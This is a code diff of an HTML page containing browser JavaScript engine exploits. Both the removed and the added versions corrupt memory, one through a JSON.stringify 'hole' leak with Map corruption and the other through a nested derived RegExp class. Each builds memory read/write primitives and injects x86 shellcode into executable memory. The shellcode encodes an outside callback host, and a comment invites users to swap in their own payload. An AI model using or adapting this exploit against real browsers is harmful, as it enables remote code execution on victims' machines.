@@ -1,10 +1,13 @@
-<script type="text/javascript">
-
-function gc() {
-    for (var i = 0; i < 0x100; i++) new Array(0x200);
-  }
-  var shellcode = [
-0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
+<html>
+<head>
+<metahttp-equiv="Content-Type" content="text/html;charset=utf-8">
+</head>
+<h1>test</h1>
+<script>
+ENABLE_LOG = true;
+IN_WORKER = true;
+// run calc and hang in a loop
+var shellcode = [0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 
 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 
@@ -20,93 +23,150 @@ function gc() {
 0x2f, 0x2f, 0x79, 0x36, 0x35, 0x64, 0x76, 0x36, 0x72, 0x33, 0x73, 0x61, 0x72, 0x6e, 0x35, 
 0x78, 0x68, 0x36, 0x7a, 0x6b, 0x63, 0x37, 0x72, 0x73, 0x6d, 0x38, 0x39, 0x7a, 0x66, 0x71, 
 0x33, 0x70, 0x72, 0x65, 0x2e, 0x6f, 0x61, 0x73, 0x74, 0x69, 0x66, 0x79, 0x2e, 0x63, 0x6f, 
-0x6d, 0x00
-  ];
-  var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
-  var dv = new DataView(new ArrayBuffer(0x10));
-  function f2big(f) {
-    dv.setFloat64(0, f, true);
-    return (dv.getBigUint64(0, true));
-  }
-  function big2f(b) {
-    dv.setBigUint64(0, b);
-    return dv.getFloat64(0);
-  }
-  function flow(f) {
-    dv.setFloat64(0, f, true);
-    return (dv.getUint32(0, true));
-  }
-  function fhi(f) {
-    dv.setFloat64(0, f, true);
-    return (dv.getUint32(4, true));
-  }
-  function i2f(low, hi) {
-    dv.setUint32(0, low, true);
-    dv.setUint32(4, hi, true);
-    return dv.getFloat64(0, true);
-  }
-  var oob_arr = null;
-  var leak = null;
-  var rw_buff = null;
-  for (let i = 0; i < 0x1000; i++) {
-    oob_arr = [1.1, 1.1];
-    leak = { ele: null };
-    rw_buff = new ArrayBuffer(0x1000);
-  }
-  var rw_view = new DataView(rw_buff);
-  rw_view.setBigUint64(0, 0x11223355n, true);
-  var wasmModule = new WebAssembly.Module(wasmCode);
-  var wasmInstance = new WebAssembly.Instance(wasmModule);
-  var f = wasmInstance.exports.main;
-  function trigger() {
-    let a = [], b = [];
-    let s = '"'.repeat(0x800000);
-    a[20000] = s;
-    for (let i = 0; i < 10; i++) a[i] = s;
-    for (let i = 0; i < 10; i++) b[i] = a;
-    try {
-      JSON.stringify(b);
-    } catch (hole) {
-      return hole;
-    }
-    throw new Error('could not trigger');
-  }
-  let hole = trigger();
-  var map1 = null;
-  var map2 = null;
-  var arr = null;
-  function makeMapOdd(m, h) {
-    m = new Map();
-    m.set(1, 1);
-    m.set(h, 1);
-    m.delete(h);
-    m.delete(h);
-    m.delete(1);
-    return m;
-  }
-  for (let i = 0; i < 0x1000; i++) {
-    map1 = makeMapOdd(map1, hole);
-    arr = new Array(1.1, 1.1);
-  }
-  //alert(map1.size);
-  map1.set(0x10, -1);
-  gc();
-  leak.ele = wasmInstance;
-  map1.set(oob_arr, 0xffff);
+0x6d, 0x00];//shellcode替换成自己的 注意是x86的
 
-  let wasm_low = fhi(arr[2]);
-  //alert("search wasm mod low addr: " + (wasm_low).toString(16));
-  leak.ele = null;
-  //alert("check arr indx 0");
-  arr[0] = i2f(wasm_low, 0x20);
-  
-  let rwx = flow(oob_arr[7]);
-  //alert("rwx: " + rwx.toString(16));
-  arr[5] = i2f(rwx, 0x1000);
-  alert("backingStore");
-  for (let i = 0; i < shellcode.length; i++) {
-    rw_view.setInt8(i, shellcode[i]);
-  }
-  //alert("calc");
-  f();
-</script>
+function print(data) {
+}
+var not_optimised_out = 0;
+var target_function = (function (value) {
+    if (value == 0xdecaf0) {
+        not_optimised_out += 1;
+    }
+    not_optimised_out += 1;
+    not_optimised_out |= 0xff;
+    not_optimised_out *= 12;
+});
+for (var i = 0; i < 0x10000; ++i) {
+    target_function(i);
+}
+var g_array;
+var tDerivedNCount = 17 * 87481 - 8;
+var tDerivedNDepth = 19 * 19;
+
+function cb(flag) {
+    if (flag == true) {
+        return;
+    }
+    g_array = new Array(0);
+    g_array[0] = 0x1dbabe * 2;
+    return 'c01db33f';
+}
+function gc() {
+    for (var i = 0; i < 0x10000; ++i) {
+        new String();
+    }
+}
+function oobAccess() {
+    var this_ = this;
+    this.buffer = null;
+    this.buffer_view = null;
+ 
+    this.page_buffer = null;
+    this.page_view = null;
+ 
+    this.prevent_opt = [];
+ 
+    var kSlotOffset = 0x1f;
+    var kBackingStoreOffset = 0xf;
+ 
+    class LeakArrayBuffer extends ArrayBuffer {
+        constructor() {
+            super(0x1000);
+            this.slot = this;
+        }
+    }
+ 
+    this.page_buffer = new LeakArrayBuffer();
+    this.page_view = new DataView(this.page_buffer);
+ 
+    new RegExp({ toString: function () { return 'a' } });
+    cb(true);
+ 
+    class DerivedBase extends RegExp {
+        constructor() {
+            // var array = null;
+            super(
+                // at this point, the 4-byte allocation for the JSRegExp `this` object
+                // has just happened.
+                {
+                    toString: cb
+                }, 'g'
+                // now the runtime JSRegExp constructor is called, corrupting the
+                // JSArray.
+            );
+ 
+            // this allocation will now directly follow the FixedArray allocation
+            // made for `this.data`, which is where `array.elements` points to.
+            this_.buffer = new ArrayBuffer(0x80);
+            g_array[8] = this_.page_buffer;
+        }
+    }
+ 
+    // try{
+    var derived_n = eval(`(function derived_n(i) {
+        if (i == 0) {
+            return DerivedBase;
+        }
+ 
+        class DerivedN extends derived_n(i-1) {
+            constructor() {
+                super();
+                return;
+                ${"this.a=0;".repeat(tDerivedNCount)}
+            }
+        }
+ 
+        return DerivedN;
+    })`);
+ 
+    gc();
+ 
+ 
+    new (derived_n(tDerivedNDepth))();
+ 
+    this.buffer_view = new DataView(this.buffer);
+    this.leakPtr = function (obj) {
+        this.page_buffer.slot = obj;
+        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
+    }
+ 
+    this.setPtr = function (addr) {
+        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
+    }
+    this.read32 = function (addr) {
+        this.setPtr(addr);
+        return this.page_view.getUint32(0, true, ...this.prevent_opt);
+    }
+    this.write32 = function (addr, value) {
+        this.setPtr(addr);
+        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
+    }
+    this.write8 = function (addr, value) {
+        this.setPtr(addr);
+        this.page_view.setUint8(0, value, ...this.prevent_opt);
+    }
+    this.setBytes = function (addr, content) {
+        for (var i = 0; i < content.length; i++) {
+            this.write8(addr + i, content[i]);
+        }
+    }
+    return this;
+}
+function trigger() {
+    var oob = oobAccess();
+    var func_ptr = oob.leakPtr(target_function);
+    print('[*] target_function at 0x' + func_ptr.toString(16));
+    var kCodeInsOffset = 0x1b;
+    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
+    print('[*] code_addr at 0x' + code_addr.toString(16));
+    oob.setBytes(code_addr, shellcode);
+    target_function(0);
+}
+try{
+    print("start running");
+    trigger();
+}catch(e){
+    print(e);
+}
+</script>   
+</html>
